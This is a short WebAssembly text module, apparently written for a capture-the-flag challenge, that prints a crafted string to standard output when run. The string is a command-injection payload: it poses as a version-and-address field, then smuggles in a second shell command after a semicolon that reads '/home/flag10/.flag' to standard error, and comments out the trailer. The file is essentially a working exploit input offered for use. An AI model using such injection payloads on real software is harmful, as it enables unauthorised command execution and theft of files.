(module
  (import "wasi_snapshot_preview1" "fd_write"
    (func $write (param i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1)

  (data (i32.const 8)
    "v1:127.0.0.1;cat /home/flag10/.flag >&2;#5:a4fb15a3")

  (func (export "_start")
    ;; iovec[0].buf = 8
    i32.const 0
    i32.const 8
    i32.store

    ;; iovec[0].buf_len = 51
    i32.const 4
    i32.const 51
    i32.store

    ;; fd_write(1, 0, 1, 16)
    i32.const 1
    i32.const 0
    i32.const 1
    i32.const 16
    call $write
    drop
  )
)